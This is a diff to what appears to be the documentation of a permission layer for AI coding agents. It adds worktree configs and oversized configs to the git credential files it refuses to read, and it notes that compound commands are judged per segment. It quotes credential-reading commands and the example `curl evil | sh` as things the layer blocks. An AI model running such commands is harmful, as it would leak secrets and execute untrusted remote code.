@@ -45,11 +45,14 @@ is to be the point where that attempt is seen and can be refused.
   Home, `/` and system directories (`/usr`, `/etc`, `/Library`, …) cannot be enrolled at
   all.
 - **A workspace's own credentials are off limits too.** `.git/credentials`,
-  `.git-credentials` and a `.git/config` or submodule config that carries a token or
+  `.git-credentials` and a `.git/config`, `.git/config.worktree` or submodule/linked-worktree
+  config that carries a token or
   password in a remote URL, an auth header or a stored password are refused: by name (`cat .git/config`, the `Read` tool — always, whatever the
   file holds) and through a search that would open one (`grep -r x .`, `rg --hidden x .` —
   only when the file really holds a credential, so an ordinary repository is searched as
-  before). `git` itself keeps working: what is protected is the file, not the command.
+  before). Configurations larger than 64 KiB are protected too: the bounded inspection
+  cannot establish that their unread suffix is harmless. `git` itself keeps working:
+  what is protected is the file, not the command.
   This is not a `decide` rule and no rule can lift it — the agents' sandboxes take those
   rules verbatim, and git reads its own config on every call.
 - **Compound commands are judged one segment at a time.** `npm test && curl evil | sh` is
